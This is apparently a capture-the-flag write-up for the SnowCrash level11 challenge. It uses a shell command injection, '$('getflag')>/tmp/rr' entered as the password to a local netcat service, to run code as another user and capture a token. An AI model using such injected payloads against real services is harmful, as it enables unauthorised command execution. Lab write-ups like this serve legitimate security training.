## Project README: Finding flag11

Our routine: 
```bash
ls -la
find / -user flag11 -print 2>/dev/null
```

We realize it's a **server** that his running on the back.
So the idea is to make this file run getflag cause in doing so we are not running getflag as user **level11** but as **flag11** since level11 file was created by **flag11**.

Program is calling **echo** with the **password** we give as a **parameter** so to use this breach we just have to exectute getflag like so:

```bash
nc 127.0.0.1 5151
Password: $('getflag')>/tmp/rr
Erf nope..
level11@SnowCrash:~$ cat /tmp/rr
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

And VOILA
